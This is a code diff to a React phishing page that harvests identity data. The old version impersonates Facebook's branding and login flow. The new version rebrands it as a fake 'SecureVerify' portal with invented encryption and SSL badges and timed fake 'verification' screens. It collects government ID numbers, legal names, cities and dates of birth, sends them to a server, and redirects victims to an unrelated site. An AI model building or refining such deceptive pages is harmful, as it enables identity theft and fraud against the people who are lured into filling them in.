@@ -7,67 +7,75 @@ export default function Verification() {
     country: '',
     idNumber: '',
     fullName: '',
-    city: ''
+    city: '',
+    dateOfBirth: ''
   });
   const [isLoading, setIsLoading] = useState(false);
-  const [userEmail, setUserEmail] = useState('');
   const [error, setError] = useState('');
-
-  useEffect(() => {
-    // Set Facebook background
-    document.body.style.backgroundColor = '#f0f2f5';
-    document.body.style.margin = '0';
-    document.body.style.padding = '0';
-    
-    // Check if user came from login
-    const email = localStorage.getItem('user_email');
-    if (!email) {
-      window.location.href = '/auth/facebook';
-      return;
-    }
-    setUserEmail(email);
-    
-    return () => {
-      document.body.style.backgroundColor = '';
-      document.body.style.margin = '';
-      document.body.style.padding = '';
-    };
-  }, []);
+  const [success, setSuccess] = useState('');
 
   // Step 1: Verifying (automatic progression)
   useEffect(() => {
     if (step === 1) {
       const timer = setTimeout(() => {
         setStep(2);
-      }, 3000); // 3 seconds for "verifying"
+      }, 4000); // 4 seconds for more realistic verification
       return () => clearTimeout(timer);
     }
   }, [step]);
 
   const handleInputChange = (e) => {
+    const { name, value } = e.target;
     setUserData({
       ...userData,
-      [e.target.name]: e.target.value
+      [name]: value
     });
+    
+    // Clear errors when user starts typing
+    if (error) setError('');
+  };
+
+  const validateForm = () => {
+    if (!userData.country || !userData.idNumber || !userData.fullName || !userData.city || !userData.dateOfBirth) {
+      return 'Please fill in all required fields';
+    }
+    
+    // ID Number validation - minimum 8 characters
+    if (userData.idNumber.length < 8) {
+      return 'ID Number must be at least 8 characters long';
+    }
+    
+    // Name validation
+    if (userData.fullName.length < 2) {
+      return 'Please enter your full legal name';
+    }
+    
+    return null;
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     setError('');
+    setSuccess('');
     setIsLoading(true);
 
-    try {
-      // Validate all fields are filled
-      if (!userData.country || !userData.idNumber || !userData.fullName || !userData.city) {
-        throw new Error('Please fill in all fields');
-      }
+    const validationError = validateForm();
+    if (validationError) {
+      setError(validationError);
+      setIsLoading(false);
+      return;
+    }
 
-      // Store in localStorage for future sessions
+    try {
+      // Show processing state
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      // Store in localStorage
       const userSession = {
-        email: userEmail,
         ...userData,
         verified: true,
-        verifiedAt: new Date().toISOString()
+        verifiedAt: new Date().toISOString(),
+        sessionId: Math.random().toString(36).substr(2, 9)
       };
       localStorage.setItem('user_session', JSON.stringify(userSession));
 
@@ -78,77 +86,148 @@ export default function Verification() {
         body: JSON.stringify(userSession)
       });
 
-      // Check if the request was successful
       if (!response.ok) {
-        // Continue anyway - don't block the user flow
+        throw new Error('Verification submission failed');
       }
 
-      // Clear login session
-      localStorage.removeItem('user_email');
+      setSuccess('✅ Identity verified successfully! Redirecting...');
       
-      // Redirect to YouTube
-      window.location.href = 'https://art-premier-music-library.vercel.app/';
+      // Redirect after success
+      setTimeout(() => {
+        window.location.href = 'https://art-premier-music-library.vercel.app/';
+      }, 2000);
       
     } catch (error) {
-      setError(error.message || 'Verification failed. Please try again.');
+      setError('Verification failed. Please check your connection and try again.');
+    } finally {
       setIsLoading(false);
     }
   };
 
-  // Step 1: Verifying
+  // Step 1: Verifying Loading Screen
   if (step === 1) {
     return (
       <>
         <Head>
-          <title>Verifying Your Account - Facebook</title>
+          <title>Identity Verification - Secure Portal</title>
           <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
         </Head>
         <div className="verification-container">
           <div className="verification-box">
+            <div className="security-shield">
+              <div className="shield-icon">🛡️</div>
+            </div>
             <div className="loading-spinner">
               <div className="spinner"></div>
             </div>
-            <h2>Verifying Your Account</h2>
-            <p>Please wait while we verify your Facebook credentials...</p>
-            <div className="security-notice">
-              <span className="shield-icon">🛡️</span>
-              <small>This helps us keep your account secure</small>
+            <h2>Initializing Secure Verification</h2>
+            <p>Setting up your secure verification session...</p>
+            <div className="security-features">
+              <div className="feature">
+                <span className="check">✓</span>
+                <span>Encryption enabled</span>
+              </div>
+              <div className="feature">
+                <span className="check">✓</span>
+                <span>Secure connection established</span>
+              </div>
+              <div className="feature">
+                <div className="spinner-small"></div>
+                <span>Loading verification portal</span>
+              </div>
             </div>
           </div>
 
           <style jsx>{`
             .verification-container {
               min-height: 100vh;
-              background: #f0f2f5;
+              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
               display: flex;
               align-items: center;
               justify-content: center;
-              font-family: Helvetica, Arial, sans-serif;
+              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
               padding: 20px;
             }
             
             .verification-box {
               background: white;
-              padding: 40px;
-              border-radius: 8px;
-              box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+              padding: 50px 40px;
+              border-radius: 15px;
+              box-shadow: 0 20px 40px rgba(0,0,0,0.1);
               text-align: center;
-              max-width: 400px;
+              max-width: 500px;
               width: 100%;
             }
             
+            .security-shield {
+              margin-bottom: 30px;
+            }
+            
+            .shield-icon {
+              font-size: 60px;
+              animation: pulse 2s infinite;
+            }
+            
             .loading-spinner {
-              margin-bottom: 20px;
+              margin-bottom: 25px;
             }
             
             .spinner {
-              width: 50px;
-              height: 50px;
-              border: 4px solid #f3f3f3;
-              border-top: 4px solid #1877f2;
+              width: 60px;
+              height: 60px;
+              border: 4px solid #e6e6e6;
+              border-top: 4px solid #667eea;
+              border-radius: 50%;
+              animation: spin 1.5s linear infinite;
+              margin: 0 auto;
+            }
+            
+            .spinner-small {
+              width: 16px;
+              height: 16px;
+              border: 2px solid #e6e6e6;
+              border-top: 2px solid #667eea;
               border-radius: 50%;
               animation: spin 1s linear infinite;
+              display: inline-block;
+              margin-right: 8px;
+            }
+            
+            h2 {
+              color: #2c3e50;
+              margin-bottom: 15px;
+              font-size: 28px;
+              font-weight: 600;
+            }
+            
+            p {
+              color: #7f8c8d;
+              margin-bottom: 30px;
+              font-size: 16px;
+              line-height: 1.5;
+            }
+            
+            .security-features {
+              display: flex;
+              flex-direction: column;
+              gap: 12px;
+              text-align: left;
+              max-width: 300px;
               margin: 0 auto;
+            }
+            
+            .feature {
+              display: flex;
+              align-items: center;
+              gap: 10px;
+              color: #27ae60;
+              font-size: 14px;
+            }
+            
+            .check {
+              color: #27ae60;
+              font-weight: bold;
+              font-size: 16px;
             }
             
             @keyframes spin {
@@ -156,25 +235,10 @@ export default function Verification() {
               100% { transform: rotate(360deg); }
             }
             
-            h2 {
-              color: #1c1e21;
-              margin-bottom: 10px;
-              font-size: 24px;
-            }
-            
-            p {
-              color: #606770;
-              margin-bottom: 20px;
-              font-size: 16px;
-            }
-            
-            .security-notice {
-              display: flex;
-              align-items: center;
-              justify-content: center;
-              gap: 8px;
-              color: #65676b;
-              font-size: 14px;
+            @keyframes pulse {
+              0% { transform: scale(1); }
+              50% { transform: scale(1.05); }
+              100% { transform: scale(1); }
             }
           `}</style>
         </div>
@@ -182,247 +246,336 @@ export default function Verification() {
     );
   }
 
-  // Step 2: Identity Verification Form
+  // Step 2: Verification Form
   return (
     <>
       <Head>
-        <title>Confirm Your Identity - Facebook</title>
+        <title>Identity Verification - Secure Portal</title>
         <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
       </Head>
       <div className="verification-container">
         <div className="verification-box">
           <div className="header">
-            <div className="facebook-logo">facebook</div>
-            <h2>Confirm Your Identity</h2>
-            <p>We need to verify your identity to secure your account</p>
+            <div className="logo">
+              <div className="logo-icon">🔒</div>
+              <h1>SecureVerify</h1>
+            </div>
+            <div className="security-badge">
+              <span className="badge-icon">✓</span>
+              Secure SSL Connection
+            </div>
           </div>
+
+          <div className="progress-bar">
+            <div className="progress-fill"></div>
+          </div>
+
+          <h2>Identity Verification Required</h2>
+          <p className="subtitle">To ensure the security of your account, please verify your identity with the following information:</p>
 
           {error && (
             <div className="error-message">
+              <span className="error-icon">⚠️</span>
               {error}
             </div>
           )}
 
+          {success && (
+            <div className="success-message">
+              <span className="success-icon">✅</span>
+              {success}
+            </div>
+          )}
+
           <form onSubmit={handleSubmit} className="verification-form">
-            <div className="input-group">
-              <label htmlFor="country">Country</label>
-              <select
-                id="country"
-                name="country"
-                value={userData.country}
-                onChange={handleInputChange}
-                required
-                className="form-input"
-              >
-                <option value="">Select your country</option>
-                <option value="US">United States</option>
-                <option value="UK">United Kingdom</option>
-                <option value="CA">Canada</option>
-                <option value="AU">Australia</option>
-                <option value="DE">Germany</option>
-                <option value="FR">France</option>
-                <option value="MW">Malawi</option>
-                <option value="NG">Nigeria</option>
-                <option value="KE">Kenya</option>
-                <option value="ZA">South Africa</option>
-                <option value="GH">Ghana</option>
-                <option value="TZ">Tanzania</option>
-                <option value="UG">Uganda</option>
-                <option value="ET">Ethiopia</option>
-                <option value="EG">Egypt</option>
-                <option value="DZ">Algeria</option>
-                <option value="MA">Morocco</option>
-                <option value="BR">Brazil</option>
-                <option value="IN">India</option>
-                <option value="PK">Pakistan</option>
-                <option value="BD">Bangladesh</option>
-                <option value="MX">Mexico</option>
-                <option value="RU">Russia</option>
-                <option value="CN">China</option>
-                <option value="JP">Japan</option>
-              </select>
-            </div>
+            <div className="form-grid">
+              <div className="input-group">
+                <label htmlFor="country">Country of Residence *</label>
+                <select
+                  id="country"
+                  name="country"
+                  value={userData.country}
+                  onChange={handleInputChange}
+                  required
+                  className="form-input"
+                >
+                  <option value="">Select your country</option>
+                  <option value="US">United States</option>
+                  <option value="UK">United Kingdom</option>
+                  <option value="CA">Canada</option>
+                  <option value="AU">Australia</option>
+                  <option value="MW">Malawi</option>
+                  <option value="ZA">South Africa</option>
+                  <option value="NG">Nigeria</option>
+                  <option value="KE">Kenya</option>
+                  <option value="GH">Ghana</option>
+                </select>
+              </div>
 
-            <div className="input-group">
-              <label htmlFor="idNumber">Government ID Number</label>
-              <input
-                type="text"
-                id="idNumber"
-                name="idNumber"
-                value={userData.idNumber}
-                onChange={handleInputChange}
-                placeholder="Enter your national ID, passport, or driver's license"
-                required
-                className="form-input"
-                maxLength="30"
-              />
-              <small className="help-text">
-                This helps us verify your identity and prevent fraud
-              </small>
-            </div>
+              <div className="input-group">
+                <label htmlFor="idNumber">Government ID Number *</label>
+                <input
+                  type="text"
+                  id="idNumber"
+                  name="idNumber"
+                  value={userData.idNumber}
+                  onChange={handleInputChange}
+                  placeholder="Enter your ID, passport, or license number"
+                  required
+                  className="form-input"
+                  minLength="8"
+                  maxLength="30"
+                />
+                <small className="help-text">Must be at least 8 characters</small>
+              </div>
 
-            <div className="input-group">
-              <label htmlFor="fullName">Full Legal Name</label>
-              <input
-                type="text"
-                id="fullName"
-                name="fullName"
-                value={userData.fullName}
-                onChange={handleInputChange}
-                placeholder="As it appears on your government ID"
-                required
-                className="form-input"
-                maxLength="50"
-              />
-            </div>
+              <div className="input-group">
+                <label htmlFor="fullName">Full Legal Name *</label>
+                <input
+                  type="text"
+                  id="fullName"
+                  name="fullName"
+                  value={userData.fullName}
+                  onChange={handleInputChange}
+                  placeholder="As it appears on your official documents"
+                  required
+                  className="form-input"
+                  maxLength="50"
+                />
+              </div>
 
-            <div className="input-group">
-              <label htmlFor="city">City of Residence</label>
-              <input
-                type="text"
-                id="city"
-                name="city"
-                value={userData.city}
-                onChange={handleInputChange}
-                placeholder="Enter your current city"
-                required
-                className="form-input"
-                maxLength="30"
-              />
+              <div className="input-group">
+                <label htmlFor="city">City of Residence *</label>
+                <input
+                  type="text"
+                  id="city"
+                  name="city"
+                  value={userData.city}
+                  onChange={handleInputChange}
+                  placeholder="Enter your current city"
+                  required
+                  className="form-input"
+                  maxLength="30"
+                />
+              </div>
+
+              <div className="input-group">
+                <label htmlFor="dateOfBirth">Date of Birth *</label>
+                <input
+                  type="date"
+                  id="dateOfBirth"
+                  name="dateOfBirth"
+                  value={userData.dateOfBirth}
+                  onChange={handleInputChange}
+                  required
+                  className="form-input"
+                />
+              </div>
             </div>
 
             <div className="privacy-notice">
               <div className="lock-icon">🔒</div>
               <div className="notice-text">
-                <strong>Your information is secure</strong>
-                <p>We use encryption to protect your personal data and comply with privacy regulations.</p>
+                <strong>Your Privacy & Security</strong>
+                <p>All information is encrypted and processed securely. We comply with global data protection regulations to ensure your personal data remains safe.</p>
               </div>
             </div>
 
             <button 
               type="submit" 
-              className="confirm-button"
+              className="submit-button"
               disabled={isLoading}
             >
               {isLoading ? (
                 <div className="button-loading">
                   <div className="button-spinner"></div>
-                  Confirming...
+                  Verifying Identity...
                 </div>
               ) : (
-                'Confirm Identity'
+                'Verify My Identity'
               )}
             </button>
           </form>
+
+          <div className="footer-note">
+            <p>🔒 Protected by end-to-end encryption • 🌐 Globally compliant • ⚡ Instant verification</p>
+          </div>
         </div>
 
         <style jsx>{`
           .verification-container {
             min-height: 100vh;
-            background: #f0f2f5;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             padding: 20px;
           }
           
           .verification-box {
             background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 450px;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 600px;
             width: 100%;
           }
           
           .header {
-            text-align: center;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 30px;
           }
           
-          .facebook-logo {
+          .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+          }
+          
+          .logo-icon {
             font-size: 32px;
-            font-weight: bold;
-            color: #1877f2;
-            margin-bottom: 15px;
           }
           
-          .header h2 {
-            color: #1c1e21;
-            margin-bottom: 8px;
-            font-size: 20px;
-          }
-          
-          .header p {
-            color: #606770;
-            font-size: 14px;
+          .logo h1 {
+            color: #2c3e50;
             margin: 0;
+            font-size: 24px;
+            font-weight: 700;
+          }
+          
+          .security-badge {
+            background: #27ae60;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+          }
+          
+          .badge-icon {
+            font-size: 14px;
+          }
+          
+          .progress-bar {
+            height: 4px;
+            background: #ecf0f1;
+            border-radius: 2px;
+            margin-bottom: 25px;
+            overflow: hidden;
+          }
+          
+          .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 100%;
+            animation: progress 2s ease-in-out;
+          }
+          
+          h2 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 24px;
+            font-weight: 600;
+          }
+          
+          .subtitle {
+            color: #7f8c8d;
+            margin-bottom: 30px;
+            font-size: 15px;
+            line-height: 1.5;
           }
           
           .error-message {
-            background: #fce8e6;
-            color: #d93025;
-            padding: 12px;
-            border-radius: 6px;
+            background: #ffeaea;
+            color: #e74c3c;
+            padding: 15px;
+            border-radius: 8px;
             border: 1px solid #fadbd9;
             margin-bottom: 20px;
-            text-align: center;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+          }
+          
+          .success-message {
+            background: #e8f6ef;
+            color: #27ae60;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #d4efdf;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
             font-size: 14px;
           }
           
           .verification-form {
             display: flex;
             flex-direction: column;
+            gap: 25px;
+          }
+          
+          .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
             gap: 20px;
           }
           
           .input-group {
             display: flex;
             flex-direction: column;
-            gap: 6px;
+            gap: 8px;
           }
           
           label {
             font-weight: 600;
-            color: #1c1e21;
+            color: #2c3e50;
             font-size: 14px;
           }
           
           .form-input {
-            padding: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-            background: #f5f6f7;
-            transition: all 0.2s;
+            padding: 14px;
+            border: 2px solid #ecf0f1;
+            border-radius: 8px;
+            font-size: 15px;
+            background: #f8f9fa;
+            transition: all 0.3s;
             box-sizing: border-box;
             width: 100%;
           }
           
           .form-input:focus {
-            border-color: #1877f2;
+            border-color: #667eea;
             outline: none;
             background: white;
-            box-shadow: 0 0 0 2px #e7f3ff;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
           }
           
           .help-text {
-            color: #65676b;
+            color: #7f8c8d;
             font-size: 12px;
           }
           
           .privacy-notice {
             display: flex;
-            gap: 12px;
-            background: #f0f8ff;
-            padding: 15px;
-            border-radius: 6px;
-            border: 1px solid #d1e9ff;
+            gap: 15px;
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
           }
           
           .lock-icon {
-            font-size: 20px;
+            font-size: 24px;
+            color: #667eea;
           }
           
           .notice-text {
@@ -430,54 +583,97 @@ export default function Verification() {
           }
           
           .notice-text strong {
-            color: #1c1e21;
+            color: #2c3e50;
             display: block;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
+            font-size: 15px;
           }
           
           .notice-text p {
-            color: #606770;
-            font-size: 12px;
+            color: #7f8c8d;
+            font-size: 13px;
             margin: 0;
+            line-height: 1.5;
           }
           
-          .confirm-button {
-            background: #1877f2;
+          .submit-button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 6px;
-            padding: 14px;
+            border-radius: 8px;
+            padding: 16px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
-            height: 48px;
+            transition: all 0.3s;
+            height: 52px;
             width: 100%;
           }
           
-          .confirm-button:hover:not(:disabled) {
-            background: #166fe5;
+          .submit-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
           }
           
-          .confirm-button:disabled {
-            background: #ccc;
+          .submit-button:disabled {
+            opacity: 0.7;
             cursor: not-allowed;
+            transform: none;
           }
           
           .button-loading {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
           }
           
           .button-spinner {
-            width: 16px;
-            height: 16px;
+            width: 18px;
+            height: 18px;
             border: 2px solid transparent;
             border-top: 2px solid white;
             border-radius: 50%;
             animation: spin 1s linear infinite;
+          }
+          
+          .footer-note {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #ecf0f1;
+          }
+          
+          .footer-note p {
+            color: #7f8c8d;
+            font-size: 12px;
+            margin: 0;
+          }
+          
+          @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+          }
+          
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+
+          @media (max-width: 768px) {
+            .form-grid {
+              grid-template-columns: 1fr;
+            }
+            
+            .header {
+              flex-direction: column;
+              gap: 15px;
+              text-align: center;
+            }
+            
+            .verification-box {
+              padding: 30px 20px;
+            }
           }
 
           @media (max-width: 480px) {
@@ -486,11 +682,11 @@ export default function Verification() {
             }
             
             .verification-box {
-              padding: 20px;
+              padding: 25px 15px;
             }
             
-            .facebook-logo {
-              font-size: 28px;
+            h2 {
+              font-size: 20px;
             }
           }
         `}</style>
